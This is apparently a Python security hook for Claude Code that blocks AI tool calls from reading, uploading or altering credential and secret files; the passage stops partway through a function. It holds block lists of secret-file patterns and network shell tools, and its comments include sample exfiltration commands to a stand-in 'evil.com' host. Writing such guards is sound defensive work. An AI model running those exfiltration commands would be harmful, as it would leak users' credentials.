#!/usr/bin/python3
"""protect-files.py (hardened)."""
# why: single-file hook wired directly into the PreToolUse hook path; a
# multi-file split would need its own package/import wiring in settings.json
# for no functional gain, so the line-count ceiling is waived here only.
# pylint: disable=too-many-lines

from collections.abc import Callable, Iterator, Mapping
import fnmatch
import glob
import json
import os
from pathlib import Path
import re
import shlex
import sys
import unicodedata

script_dir = os.path.dirname(os.path.abspath(__file__))
if script_dir not in sys.path:
    sys.path.append(script_dir)

from secret_scan import scan_content_for_secrets  # noqa: E402
from utils import get_by_key, get_hooks_logger, split_on_operators  # noqa: E402

logger = get_hooks_logger("ProtectFiles")

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────

# CLAUDE_PROJECT_DIR (set by Claude Code) takes precedence when present, since it's
# stable for the whole session; os.getcwd() is the fallback but can drift if cwd
# changes mid-session (cd, subagents), silently widening the boundary check.
PROJECT_ROOT = os.environ.get("CLAUDE_PROJECT_DIR", os.getcwd())

# Get the home directory path object
home_dir = str(Path.home())

ALLOWED_PATTERNS = [
    os.path.join(PROJECT_ROOT, ".claude", "**"),
    "/tmp/**",  # noqa: S108 - a fixed allowlist glob, not a temp-file write
    f"{home_dir}/develop/personal/AI-pair-programming/skills/**",
    f"{home_dir}/develop/personal/AI-pair-programming/instructions/**",
    f"{home_dir}/Desktop/*.md",
    f"{home_dir}/Desktop/*.png",
    f"{home_dir}/Desktop/*.jpeg",
    f"{home_dir}/Desktop/*.json",
    f"{home_dir}/.claude/projects/**/memory/*.md",
]

# User-controlled extension of ALLOWED_PATTERNS. Only takes effect if set in
# the shell BEFORE launching Claude Code (e.g. in ~/.zshrc or exported prior
# to `claude`), since this hook process only inherits env from its parent
# (the Claude Code core process), never from a Bash tool subshell — a value
# Claude sets via `export` inside a Bash call dies with that subprocess and
# never reaches here. Colon-separated glob patterns.
_extra_allowed = os.environ.get("PROTECT_FILES_EXTRA_ALLOWED", "")
if _extra_allowed:
    ALLOWED_PATTERNS.extend(p for p in _extra_allowed.split(":") if p)

# MCP server tool calls (tool_name = "mcp__<server>__<tool>") route file args
# through their own server-side auth (e.g. ai-memory scopes to its own DB,
# serena/rag-rat operate read-only on the indexed repo) — path-checking them
# here produces false positives (a legit external path arg denied because it
# looks like a system path) with no real security gain, since these servers
# never hand raw file bytes back through this hook's read/write surface.
# Colon-separated server names; comma/space also accepted for convenience.
MCP_SERVER_ALLOWLIST = {
    s
    for s in re.split(r"[:,\s]+", os.environ.get("PROTECT_FILES_MCP_ALLOWLIST", ""))
    if s
}


def is_allowlisted_mcp_tool(tool_name: str | None) -> bool:
    """True if tool_name is an MCP tool routed through an allowlisted server.

    Args:
        tool_name: The hook payload's tool_name field.

    Returns:
        True if the tool is an MCP call whose server is in the allowlist.
    """
    if not tool_name or not tool_name.startswith("mcp__"):
        return False
    parts = tool_name.split("__")
    server = parts[1] if len(parts) > 1 else ""
    return server in MCP_SERVER_ALLOWLIST


PROTECTED_PATTERNS = [
    ".env",
    ".env.*",
    "**/*.env",
    "**/*.secret",
    "**/*.secrets",
    "**/secrets/**",
    "**/*.pem",
    "**/*.key",
    "**/id_rsa*",
    "**/.ssh/**",
    "**/id_*",
    "**/*.pub",  # opcional (menos crítico, mas útil)
    "**/.gnupg/**",
    "**/*.gpg",
    "**/*.asc",
    "**/.aws/**",
    "**/.azure/**",
    "**/.gcloud/**",
    "**/credentials",
    "**/.git-credentials",
    "**/.gitconfig",
    "**/.netrc",
    "**/.npmrc",
    "**/.yarnrc",
    "**/.pypirc",
    "**/.docker/config.json",
    "**/.kube/config",
    "**/kubeconfig",
    "**/.bash_history",
    "**/.zsh_history",
    "**/.python_history",
    "**/.sqlite_history",
    "**/.psql_history",
    "**/.mysql_history",
    "**/.config/BraveSoftware/**",
    "**/.config/google-chrome/**",
    "**/.config/chromium/**",
    "**/.mozilla/**",
    "**/.cache/mozilla/**",
    "**/*.crt",
    "**/*.csr",
    "**/*.p12",
    "**/*.pfx",
    "**/*.der",
    "**/.git/config",
    "**/.terraform/**",
    "**/*.tfstate",
    "**/*.tfstate.*",
    "**/*.jks",
    "**/*.keystore",
    "**/.dockercfg",
    "**/.config/gh/hosts.yml",
    "/proc/*/environ",
    "/proc/self/environ",
    "**/.pgpass",
    "**/.git/hooks/**",
    "**/.node_repl_history",
    "**/.irb_history",
    "**/fish_history",
    # .claude/hooks, .claude/settings.json etc are symlinks into these real
    # paths — normalize() resolves symlinks, so protect the real targets too,
    # or realpath silently strips the .claude/** prefix before matching.
    os.path.join(PROJECT_ROOT, ".claude", "hooks", "**"),
    os.path.join(PROJECT_ROOT, ".claude", "settings.json"),
    os.path.join(PROJECT_ROOT, ".claude", "settings.local.json"),
]

READ_COMMANDS = {
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "grep",
    "awk",
    "sed",
    "bat",
    "xxd",
    "od",
    "strings",
    "base64",
    "openssl",
}

# commands whose args are ALL file targets (both src/dest for copy-like tools)
COPY_COMMANDS = {"cp", "mv", "rsync", "scp", "install", "dd", "tar", "zip", "cat"}

# destructive/permission commands: delete, wipe, or loosen perms on a target file
DESTRUCTIVE_COMMANDS = {"rm", "unlink", "shred", "truncate"}

# commands whose FIRST non-flag arg is a mode/owner spec, not a file target
PERM_COMMANDS = {"chmod", "chown", "chgrp", "setfacl"}

# getfacl has no mode/owner spec arg — every non-flag arg is a file target
PERM_READONLY_COMMANDS = {"getfacl"}

# commands that can exfiltrate file contents over the network via upload flags
NETWORK_COMMANDS = {"curl", "wget"}

# hazard: raw-socket tools can pipe/redirect file contents out, so any
# non-flag arg is treated as suspect
RAW_SOCKET_COMMANDS = {"nc", "ncat", "socat", "telnet"}

# commands that hide their real target inside a nested string/pipe, so the
# static tokenizer can't see it directly — force a whole-line fallback scan
OPAQUE_COMMANDS = {"eval", "xargs"}

UPLOAD_FLAGS = {"-T", "--upload-file", "-d", "--data", "--data-binary", "--data-raw"}

# substrings that flag a curl/wget arg (URL, query string, data payload) as
# possibly embedding a protected file's name/contents, even without an upload flag
PROTECTED_KEYWORDS = (
    ".env",
    ".secret",
    ".pem",
    ".key",
    "id_rsa",
    ".ssh",
    ".pub",
    ".gnupg",
    ".gpg",
    ".asc",
    ".aws",
    ".azure",
    ".gcloud",
    "credentials",
    ".git-credentials",
    ".gitconfig",
    ".netrc",
    ".npmrc",
    ".yarnrc",
    ".pypirc",
    ".kube",
    "kubeconfig",
    "_history",
    ".p12",
    ".pfx",
)

# hazard: interpreters can read/exfil any file via inline code, bypassing
# READ_COMMANDS entirely
INTERPRETER_COMMANDS = {
    "python",
    "python3",
    "node",
    "perl",
    "ruby",
    "php",
    "bash",
    "sh",
    "zsh",
}
INLINE_CODE_FLAGS = {"-c", "-e", "--eval"}

# shells whose -c argument is itself a shell command line, not quoted-string
# code — must be re-tokenized as shell, not scanned for nested quote literals
SHELL_INTERPRETER_COMMANDS = {"bash", "sh", "zsh"}

REDIRECT_OPERATORS = {">", ">>"}
INPUT_REDIRECT_OPERATORS = {"<", "<<"}

SHELL_OPERATORS = {"|", ">", ">>", "<", "&&", "||", ";", "\n"}

# bash process substitution: <(cmd) / >(cmd) — smuggles a command whose
# output/input is a target file, bypassing normal tokenization entirely
PROCESS_SUBSTITUTION_RE = re.compile(r"[<>]\(([^()]*)\)")

# Shell keywords that are structural, not commands to scan for targets —
# they appear as segments after splitting on ;/newlines inside for/while/if
# blocks (e.g. "do", "done"). Ported from smart_approve.py.
SHELL_KEYWORDS = frozenset(
    {
        "do",
        "done",
        "then",
        "else",
        "elif",
        "fi",
        "esac",
        "{",
        "}",
        "break",
        "continue",
    }
)

# Compound statement headers (for/while/until/if/case/select) — control
# flow, not executable commands with file targets of their own.
_COMPOUND_HEADER_RE = re.compile(r"^(for|while|until|if|case|select)\b")


# ─────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────


def normalize(path: str) -> str:
    r"""Normalize + resolve symlinks.

    NFKC folds lookalike separator/punctuation codepoints (e.g. U+2044
    FRACTION SLASH, U+FF0E FULLWIDTH FULL STOP) to their ASCII form before
    pattern matching, so a homoglyph can't slip a protected path past
    PROTECTED_PATTERNS. Null bytes are stripped for the same reason — some
    downstream parsers truncate at \\x00, which would let a suffix like
    ".env\\x00.txt" be read as ".env" while the raw string dodges fnmatch.

    Args:
        path: Raw path string from a tool call.

    Returns:
        The normalized, symlink-resolved absolute path.
    """
    path = unicodedata.normalize("NFKC", path).replace("\x00", "")
    try:
        return os.path.realpath(os.path.abspath(path))
    except (OSError, ValueError):
        return path


def is_within_project(path: str) -> bool:
    """True if normalized path is PROJECT_ROOT or lives under it.

    Args:
        path: Raw path string from a tool call.

    Returns:
        True if the normalized path is PROJECT_ROOT or a descendant of it.
    """
    norm = normalize(path)
    return norm == PROJECT_ROOT or norm.startswith(PROJECT_ROOT.rstrip("/") + os.sep)


def is_allowed(path: str) -> bool:
    """Check if path is in allowed patterns (safe to access).

    Args:
        path: Normalized path string to check.

    Returns:
        True if path matches an entry in ALLOWED_PATTERNS.
    """
    p = Path(path)
    for pattern in ALLOWED_PATTERNS:
        if fnmatch.fnmatch(path, pattern) or p.match(pattern):
            return True
    return False


def matches_pattern(path: str) -> tuple[bool, str]:
    """Match against protected patterns using pathlib semantics.

    Matching is case-folded so a case-insensitive filesystem (macOS,
    Windows) can't be used to read ".env" via a differently-cased path
    like ".ENV" that would otherwise miss every pattern below.

    Args:
        path: Normalized path string to check.

    Returns:
        A (matched, pattern) tuple; pattern is empty when matched is False.
    """
    path_lower = path.lower()
    p = Path(path_lower)

    for pattern in PROTECTED_PATTERNS:
        pattern_lower = pattern.lower()

        # direct fnmatch (string-based)
        if fnmatch.fnmatch(path_lower, pattern_lower):
            return True, pattern

        # pathlib match (more robust for **)
        if p.match(pattern_lower):
            return True, pattern

    return False, ""


def iter_string_leaves(value: object) -> list[str]:
    """Recursively collect every string value out of a nested dict/list.

    Used to scan an MCP tool's arbitrary tool_input shape for path-like or
    secret-bearing strings when the param name doesn't match a known key.

    Args:
        value: A dict, list, string, or scalar to walk.

    Returns:
        Every non-empty string leaf found anywhere in value.
    """
    strings: list[str] = []
    if isinstance(value, str):
        if value:
            strings.append(value)
    elif isinstance(value, Mapping):
        for v in value.values():
            strings.extend(iter_string_leaves(v))
    elif isinstance(value, (list, tuple)):
        for v in value:
            strings.extend(iter_string_leaves(v))
    return strings


def expand_targets(targets: list[str]) -> list[str]:
    """Expand globs like *.env → actual files.

    Args:
        targets: Raw target strings, possibly containing glob patterns.

    Returns:
        Each target's glob matches, or the target itself if it matched nothing.
    """
    expanded = []
    for t in targets:
        matches = glob.glob(t, recursive=True)
        if matches:
            expanded.extend(matches)
        else:
            expanded.append(t)
    return expanded


ENV_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)")


def expand_env_vars(text: str) -> str:
    """Resolve $VAR / ${VAR} against the hook process's own environment.

    A target passed as a bare shell variable (e.g. `cat $SECRET_FILE`) is
    left untouched by shlex — it stays the literal string "$SECRET_FILE",
    which never matches a PROTECTED_PATTERNS glob. The shell resolves it to
    the real path only after this check has already allowed the command.
    Expanding here closes that gap for any variable actually set in this
    process's environment; an unset/foreign variable is left as-is (same
    behavior as before this fix — no new false negative introduced).

    Args:
        text: Raw target string possibly containing $VAR / ${VAR}.

    Returns:
        text with every resolvable variable substituted by its value.
    """

    def repl(m: re.Match) -> str:
        """Return the matched env var's value, or the original match if unset.

        Args:
            m: Regex match for a $VAR / ${VAR} reference.

        Returns:
            The environment value, or the unmatched original text.
        """
        name = m.group(1) or m.group(2)
        return os.environ.get(name, m.group(0))

    return ENV_VAR_RE.sub(repl, text)


def _find_matching_close_paren(text: str, open_idx: int) -> int:
    """Return the index just past the ')' matching the '(' scan start.

    Args:
        text: The string to scan.
        open_idx: Index to start scanning from (just after the opening '(').

    Returns:
        Index one past the matching ')', or len(text) if unbalanced.
    """
    depth = 0
    j = open_idx
    while j < len(text):
        if text[j] == "(":
            depth += 1
        elif text[j] == ")":
            depth -= 1
            if depth == 0:
                return j + 1
        j += 1
    return j


def extract_subshells(command: str) -> list[str]:
    """Pull inner text out of $(...) / `...`, recursively.

    Depth-tracked (unlike a single regex), and skips $((...)) arithmetic
    expansion. Ported from smart_approve.py.

    Args:
        command: Raw shell command text.

    Returns:
        The inner text of every $(...) / `...` span found, recursively.
    """
    subshells = []

    i = 0
    while i < len(command):
        if (
            command[i] == "$"
            and i + 1 < len(command)
            and command[i + 1] == "("
            and not (i + 2 < len(command) and command[i + 2] == "(")
        ):
            start = i + 2
            end = _find_matching_close_paren(command, i + 1)
            content = command[start : end - 1]
            subshells.append(content)
            subshells.extend(extract_subshells(content))
            i = end
        else:
            i += 1

    parts = command.split("`")
    for idx in range(1, len(parts), 2):
        content = parts[idx]
        if content.strip():
            subshells.append(content)
            subshells.extend(extract_subshells(content))

    return subshells


def neutralize_subshells(command: str) -> str:
    """Replace each top-level $(...) / `...` span with a placeholder word.

    Their contents are already scanned independently via extract_subshells()
    — this just keeps shlex from mis-tokenizing the raw "$(...)" text when
    splitting the outer command into argv (e.g. `cat $(echo .env)` would
    otherwise shlex-split into the garbage tokens "$(echo" and ".env)").

    Args:
        command: Raw shell command text.

    Returns:
        command with every top-level $(...) / `...` span replaced by a
        single placeholder token.
    """
    result = []
    i = 0
    n = len(command)
    while i < n:
        if command[i] == "$" and i + 1 < n and command[i + 1] == "(":
            j = _find_matching_close_paren(command, i + 1)
            result.append("__SUBSHELL__")
            i = j
            continue
        if command[i] == "`":
            end = command.find("`", i + 1)
            if end == -1:
                result.append(command[i:])
                break
            result.append("__SUBSHELL__")
            i = end + 1
            continue
        result.append(command[i])
        i += 1
    return "".join(result)


def is_shell_structural(cmd: str) -> bool:
    """True if cmd is a shell keyword or compound-statement header.

    Not an actual command with file targets. Ported from smart_approve.py.

    Args:
        cmd: A single tokenized command-segment word.

    Returns:
        True if cmd is structural (not a real command with file targets).
    """
    if cmd in SHELL_KEYWORDS:
        return True
    return bool(_COMPOUND_HEADER_RE.match(cmd))


def is_standalone_assignment(cmd: str) -> bool:
    """True if cmd is purely a variable assignment (no command follows).

    E.g. "FOO=bar" — its value is picked up via expand_env_vars/subshell
    extraction elsewhere, so scanning the bare assignment is noise. Ported
    from smart_approve.py.

    Args:
        cmd: A single tokenized command-segment word.

    Returns:
        True if cmd is purely a variable assignment with no trailing command.
    """
    m = re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", cmd)
    if not m:
        return False
    return _assignment_fully_consumed(cmd, m.end())


def _skip_quoted_value(cmd: str, start: int, quote: str) -> int:
    """Skip past a quoted value starting at `start` (the opening quote).

    Args:
        cmd: A single tokenized command-segment word.
        start: Index of the opening quote character.
        quote: The quote character (`'` or `"`).

    Returns:
        Index just past the closing quote, or end of string if unterminated.
    """
    i = start + 1
    n = len(cmd)
    while i < n and cmd[i] != quote:
        if quote == '"' and cmd[i] == "\\" and i + 1 < n:
            i += 2
        else:
            i += 1
    return min(i + 1, n)


def _skip_unquoted_value(cmd: str, start: int) -> int:
    """Skip a run of non-whitespace, treating $(...) as opaque (space-safe).

    Args:
        cmd: A single tokenized command-segment word.
        start: Index to start scanning from.

    Returns:
        Index of the next top-level whitespace, or end of string.
    """
    i = start
    n = len(cmd)
    while i < n:
        if cmd[i] == "$" and i + 1 < n and cmd[i + 1] == "(":
            i = _find_matching_close_paren(cmd, i + 1)
            continue
        if cmd[i] in (" ", "\t"):
            break
        i += 1
    return i


def _assignment_fully_consumed(cmd: str, value_start: int) -> bool:
    """True if the assignment value runs to end-of-string (no trailing command).

    Args:
        cmd: A single tokenized command-segment word.
        value_start: Index just past the "NAME=" prefix.

    Returns:
        True if nothing but whitespace follows the assignment's value.
    """
    if value_start < len(cmd) and cmd[value_start] in ("'", '"'):
        end = _skip_quoted_value(cmd, value_start, cmd[value_start])
    else:
        end = _skip_unquoted_value(cmd, value_start)
    return cmd[end:].strip() == ""


def extract_upload_ref(arg: str) -> str | None:
    """Pull a file path out of an @file / field=@file style value.

    Args:
        arg: A single curl/wget argument token.

    Returns:
        The referenced path, or None if arg has no @-reference.
    """
    at = arg.find("@")
    if at == -1:
        return None
    ref = arg[at + 1 :]
    return ref if ref and ref not in ("-", "") else None


def extract_inline_code_refs(code: str) -> list[str]:
    """Pull quoted string literals out of inline interpreter code (-c/-e).

    Those are the most common way scripts embed a target file path.

    Args:
        code: The inline code string passed to -c/-e/--eval.

    Returns:
        Every quoted string literal found in code.
    """
    return re.findall(r"""['"]([^'"]{2,})['"]""", code)


def _extract_find_exec_targets(it: Iterator[str]) -> list[str]:
    """Collect non-flag arguments from a `find ... -exec`/`-execdir` clause.

    Args:
        it: Iterator positioned just after the `-exec`/`-execdir` token.

    Returns:
        Non-flag, non-placeholder arguments of the -exec/-execdir clause.
    """
    targets = []
    for sub in it:
        if sub in ("\\;", ";", "+"):
            break
        if not sub.startswith("-") and sub != "{}":
            targets.append(sub)
    return targets


def _extract_find_targets(it: Iterator[str]) -> list[str]:
    """Collect file/search-path targets from a `find` command's remaining args.

    Args:
        it: Iterator positioned just after the `find` token.

    Returns:
        Search paths and non-flag `-exec`/`-execdir` arguments.
    """
    targets = []
    for arg in it:
        if arg in SHELL_OPERATORS:
            break
        if arg in ("-exec", "-execdir"):
            targets.extend(_extract_find_exec_targets(it))
        elif not arg.startswith("-"):
            # leading search path(s), e.g. `find /home/x -name *.pem -delete`
            # — matched files inherit this path, so it must be checked too
            targets.append(arg)
    return targets


def _extract_docker_targets(it: Iterator[str]) -> list[str]:
    """Collect the source/dest path from a `docker cp` command.

    Args:
        it: Iterator positioned just after the `docker` token.

    Returns:
        Non-flag arguments to `docker cp`, with any `container:` prefix
        stripped.
    """
    targets = []
    subcmd = next(it, None)
    if subcmd == "cp":
        for arg in it:
            if arg in SHELL_OPERATORS:
                break
            if not arg.startswith("-"):
                targets.append(arg.split(":", 1)[-1] if ":" in arg else arg)
    return targets


def _extract_git_targets(it: Iterator[str]) -> list[str]:
    """Collect targets from `git show <ref>:<path>` or `git config` args.

    Args:
        it: Iterator positioned just after the `git` token.

    Returns:
        Paths from `git show ref:path`, or protected-keyword-bearing args
        from `git config`.
    """
    targets = []
    subcmd = next(it, None)
    if subcmd == "show":
        for arg in it:
            if arg in SHELL_OPERATORS:
                break
            if not arg.startswith("-") and ":" in arg:
                targets.append(arg.split(":", 1)[1])
    elif subcmd == "config":
        # tampering with credential.helper / including .gitconfig etc isn't
        # a file-target op, but the key/value can still smuggle a protected
        # reference (e.g. `git config --get credential.helper`)
        for arg in it:
            if arg in SHELL_OPERATORS:
                break
            if any(kw in arg for kw in PROTECTED_KEYWORDS):
                targets.append(arg)
    return targets


def _extract_inline_code_targets(cmd: str, arg: str) -> list[str]:
    """Extract targets from a single -c/-e inline-code argument.

    Args:
        cmd: The interpreter's basename (e.g. "python3", "bash").
        arg: The inline code string that followed the -c/-e/--eval flag.

    Returns:
        Targets found by re-tokenizing arg as shell (for bash/sh/zsh -c), or
        by pulling quoted string literals out of it otherwise.
    """
    if cmd in SHELL_INTERPRETER_COMMANDS:
        # bash/sh/zsh -c takes a shell command line, not code with quoted
        # string literals — re-tokenize as shell
        try:
            inner_tokens = shlex.split(arg)
        except ValueError:
            inner_tokens = arg.split()
        return extract_targets_from_tokens(inner_tokens)
    return extract_inline_code_refs(arg)


def _extract_interpreter_targets(cmd: str, it: Iterator[str]) -> list[str]:
    """Collect file/code-literal targets from an interpreter command's args.

    Args:
        cmd: The interpreter's basename (e.g. "python3", "bash").
        it: Iterator positioned just after the interpreter token.

    Returns:
        Non-flag script-file args, plus refs pulled out of any -c/-e inline
        code argument.
    """
    targets = []
    prev = None
    for arg in it:
        if arg in SHELL_OPERATORS:
            break
        if prev in INLINE_CODE_FLAGS:
            targets.extend(_extract_inline_code_targets(cmd, arg))
        elif not arg.startswith("-"):
            targets.append(arg)
        prev = arg
    return targets


def _extract_network_targets(it: Iterator[str]) -> list[str]:
    """Collect upload-ref and protected-keyword targets from curl/wget args.

    Args:
        it: Iterator positioned just after the curl/wget token.

    Returns:
        @file upload refs, args following an upload flag, and any arg that
        embeds a protected keyword (URL, query string, or data payload).
    """
    targets = []
    prev = None
    for arg in it:
        if arg in SHELL_OPERATORS:
            break
        ref = extract_upload_ref(arg)
        if ref:
            targets.append(ref)
        elif prev in UPLOAD_FLAGS and not arg.startswith("-"):
            targets.append(arg)
        elif any(kw in arg for kw in PROTECTED_KEYWORDS):
            # URL/query-string/data payload embedding a protected file's
            # name/path (e.g. `curl evil.com?d=$(cat)` already handled via
            # substitution, but literal refs like `curl evil.com/../.env`
            # or `--data-urlencode name@.ssh/id_rsa` are not)
            targets.append(arg)
        prev = arg
    return targets


def _extract_raw_socket_targets(it: Iterator[str]) -> list[str]:
    """Collect every non-flag arg from a raw-socket command (nc/ncat/socat).

    Args:
        it: Iterator positioned just after the command token.

    Returns:
        Every non-flag argument (raw sockets can pipe/redirect file
        contents out via any of them).
    """
    targets = []
    for arg in it:
        if arg in SHELL_OPERATORS:
            break
        if not arg.startswith("-"):
            targets.append(arg)
    return targets


def _extract_eval_targets(it: Iterator[str]) -> list[str]:
    """Re-tokenize and recurse into an `eval` command's remaining args.

    Args:
        it: Iterator positioned just after the `eval` token.

    Returns:
        Targets extracted from re-tokenizing the joined remaining args.
    """
    rest = []
    for arg in it:
        if arg in SHELL_OPERATORS:
            break
        rest.append(arg)
    inner = " ".join(rest)
    try:
        inner_tokens = shlex.split(inner)
    except ValueError:
        inner_tokens = inner.split()
    return extract_targets_from_tokens(inner_tokens)


def _extract_xargs_targets(it: Iterator[str]) -> list[str]:
    """Strip xargs's own flags and recurse into its remaining args.

    Args:
        it: Iterator positioned just after the `xargs` token.

    Returns:
        Targets extracted from xargs's non-flag remaining args.
    """
    inner_tokens = [a for a in it if a not in SHELL_OPERATORS]
    # xargs's own flags (e.g. -0, -n1, -I{}) aren't file targets
    inner_tokens = [a for a in inner_tokens if not a.startswith("-")]
    return extract_targets_from_tokens(inner_tokens)


def _extract_perm_targets(it: Iterator[str]) -> list[str]:
    """Collect path targets from a chmod/chown/chgrp/setfacl command.

    Args:
        it: Iterator positioned just after the command token.

    Returns:
        Every non-flag argument after the mode/owner spec (the spec itself,
        e.g. "644" or "root:root", is not a path).
    """
    targets = []
    skipped_spec = False
    for arg in it:
        if arg in SHELL_OPERATORS:
            break
        if arg.startswith("-"):
            continue
        if not skipped_spec:
            skipped_spec = True  # mode/owner spec, not a path
            continue
        targets.append(arg)
    return targets


def _extract_perm_readonly_targets(it: Iterator[str]) -> list[str]:
    """Collect path targets from a getfacl command (no mode/owner spec arg).

    Args:
        it: Iterator positioned just after the command token.

    Returns:
        Every non-flag argument.
    """
    targets = []
    for arg in it:
        if arg in SHELL_OPERATORS:
            break
        if not arg.startswith("-"):
            targets.append(arg)
    return targets


def _extract_copy_like_targets(it: Iterator[str]) -> list[str]:
    """Collect path targets from a destructive/read/copy-like command.

    Args:
        it: Iterator positioned just after the command token.

    Returns:
        Every non-flag argument, skipping `--key=value` style flags.
    """
    targets = []
    for arg in it:
        if arg in SHELL_OPERATORS:
            break
        if arg.startswith("-"):
            continue
        if "=" in arg and arg.startswith("--"):
            continue
        targets.append(arg)
    return targets


# invariant: checked in order; a command matching more than one group
# (impossible today, since the groups are disjoint) would only hit the first
_EXACT_NAME_HANDLERS: dict[str, Callable[[Iterator[str]], list[str]]] = {
    "find": _extract_find_targets,
    "docker": _extract_docker_targets,
    "git": _extract_git_targets,
    "eval": _extract_eval_targets,
    "xargs": _extract_xargs_targets,
}
_GROUP_HANDLERS: list[tuple[frozenset[str], Callable[[Iterator[str]], list[str]]]] = [
    (frozenset(NETWORK_COMMANDS), _extract_network_targets),
    (frozenset(RAW_SOCKET_COMMANDS), _extract_raw_socket_targets),
    (frozenset(PERM_COMMANDS), _extract_perm_targets),
    (frozenset(PERM_READONLY_COMMANDS), _extract_perm_readonly_targets),
    (
        frozenset(DESTRUCTIVE_COMMANDS | READ_COMMANDS | COPY_COMMANDS),
        _extract_copy_like_targets,
    ),
]


def _dispatch_command_targets(cmd: str, it: Iterator[str]) -> list[str]:
    """Route to the first matching per-command-family target extractor.

    Args:
        cmd: The command's basename.
        it: Iterator positioned just after the command token.

    Returns:
        That family's extracted targets, or an empty list if cmd matches
        no known family.
    """
    if cmd in INTERPRETER_COMMANDS:
        return _extract_interpreter_targets(cmd, it)
    handler = _EXACT_NAME_HANDLERS.get(cmd)
    if handler is not None:
        return handler(it)
    for group, group_handler in _GROUP_HANDLERS:
        if cmd in group:
            return group_handler(it)
    return []


def _extract_redirection_targets(tokens: list[str]) -> list[str]:
    """Collect `>`/`>>`/`<`/`<<` redirection targets, regardless of command.

    Args:
        tokens: The shlex-tokenized argv of one command segment.

    Returns:
        The token immediately following each redirection operator.
    """
    targets = []
    for i, tok in enumerate(tokens):
        if (
            tok in REDIRECT_OPERATORS or tok in INPUT_REDIRECT_OPERATORS
        ) and i + 1 < len(tokens):
            nxt = tokens[i + 1]
            if nxt not in SHELL_OPERATORS:
                targets.append(nxt)
    return targets


def extract_targets_from_tokens(tokens: list[str]) -> list[str]:
    """Extract file arguments from a single tokenized command.

    Args:
        tokens: The shlex-tokenized argv of one command segment.

    Returns:
        File-like arguments found for that command's family (redirection
        targets, plus per-command-family matches).
    """
    targets = _extract_redirection_targets(tokens)
    it = iter(tokens)
    for token in it:
        cmd = os.path.basename(token)
        targets.extend(_dispatch_command_targets(cmd, it))
        break
    return targets


def extract_file_targets(command: str) -> list[str]:
    """Extract file arguments from common read/copy commands.

    Covers chained subcommands and command substitutions ($(...) / `...`).

    Args:
        command: Raw shell command text from the Bash tool call.

    Returns:
        Every file-like target found across the command and its subshells.
    """
    targets = []

    raw_commands = split_on_operators(command, protect_exec=True)
    for sub in extract_subshells(command):
        raw_commands.extend(split_on_operators(sub, protect_exec=True))
    for m in PROCESS_SUBSTITUTION_RE.finditer(command):
        raw_commands.extend(split_on_operators(m.group(1), protect_exec=True))

    raw_commands = [
        c
        for c in raw_commands
        if not is_shell_structural(c) and not is_standalone_assignment(c)
    ]

    for sub in raw_commands:
        # nested $(...) / `...` inside this segment are scanned separately
        # via extract_subshells() above — neutralize them here so shlex
        # doesn't choke tokenizing them as literal argument text (e.g.
        # `cat $(echo .env)` shlex-splits into garbage tokens otherwise).
        neutralized = neutralize_subshells(sub)
        try:
            tokens = shlex.split(neutralized)
        except ValueError:
            tokens = neutralized.split()
        targets.extend(extract_targets_from_tokens(tokens))

    # eval/xargs can smuggle a target through stdin or a nested string that the
    # per-subcommand tokenizer can't resolve (e.g. `echo .env | xargs cat`) —
    # fall back to a whole-line keyword scan whenever either appears. Tokenize
    # with shlex first so quoted words (e.g. `echo '.env'`) get their quotes
    # stripped before the keyword match — a raw \S+ split leaves the quotes
    # attached, which then survives into normalize() as part of the filename
    # and silently dodges every PROTECTED_PATTERNS glob.
    if re.search(r"\b(eval|xargs)\b", command):
        try:
            words = shlex.split(command)
        except ValueError:
            words = command.split()
        targets.extend(
            word for word in words if any(kw in word for kw in PROTECTED_KEYWORDS)
        )

    return [expand_env_vars(t) for t in targets]


def deny(file_path: str, pattern: str, source: str) -> None:
    """Emit a deny decision for a matched protected-pattern path and exit.

    Args:
        file_path: The offending path as originally seen in the tool call.
        pattern: The PROTECTED_PATTERNS entry that matched.
        source: Short tag identifying which check triggered the deny.
    """
    print(  # noqa: T201 - hook protocol: decision JSON goes on stderr
        json.dumps(
            {
                "decision": "deny",
                "file": file_path,
                "source": source,
                "reason": f"matches protected pattern '{pattern}'",
            }
        ),
        file=sys.stderr,
    )
    logger.debug("Denied '%s' (%s) due to pattern '%s'", file_path, source, pattern)
    sys.exit(2)


def deny_secret(file_path: str, findings: list[dict]) -> None:
    """Emit a deny decision for detected secrets in a file and exit.

    Args:
        file_path: The scanned file's path.
        findings: Secret findings from detect-secrets or the regex fallback.
    """
    types = ", ".join(sorted({f["type"] for f in findings}))
    lines = sorted(
        {f["line_number"] for f in findings if "line_number" in f}
        | {f["line"] for f in findings if "line" in f}
    )
    location = f" at line(s) {', '.join(map(str, lines))}" if lines else ""
    print(  # noqa: T201 - hook protocol: decision JSON goes on stderr
        json.dumps(
            {
                "decision": "deny",
                "file": file_path,
                "source": "secret_scan",
                "reason": (
                    f"potential secret detected ({types}){location}. "
                    "If this is a false positive or test fixture, add "
                    "`# pragma: allowlist secret` on the flagged line (or "
                    "the line above it) to bypass."
                ),
            }
        ),
        file=sys.stderr,
    )
    logger.debug("Denied '%s' — secrets found: %s", file_path, findings)
    sys.exit(2)


def _check_write_content(tool_input: Mapping, tool_name: str, file_path: str) -> None:
    """Deny a Write/Edit whose new content carries a secret.

    Reads are covered after the fact by scan_secrets_output.py (redaction);
    writes must be blocked before the secret lands on disk.

    Args:
        tool_input: The tool call's input mapping.
        tool_name: The tool name.
        file_path: The target file path.
    """
    key = {"Write": "content", "Edit": "new_string"}.get(tool_name)
    content = get_by_key(tool_input, key) if key else None
    if not isinstance(content, str) or not content:
        return
    findings = scan_content_for_secrets(content, file_path, logger)
    if findings:
        deny_secret(file_path, findings)


# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────


def _check_direct_file_access(tool_input: Mapping) -> str | None:
    """Deny direct Read/Write/Edit/NotebookEdit/Grep/Glob access to protected paths.

    Args:
        tool_input: The tool call's input mapping.

    Returns:
        The resolved file_path if one was present in tool_input, else None.
    """
    # Grep/Glob use "path" instead of "file_path" — without this, a search
    # scoped to a protected file/dir (e.g. Grep pattern=".*" path=".env")
    # never hits any check below and its contents leak straight through.
    file_path = (
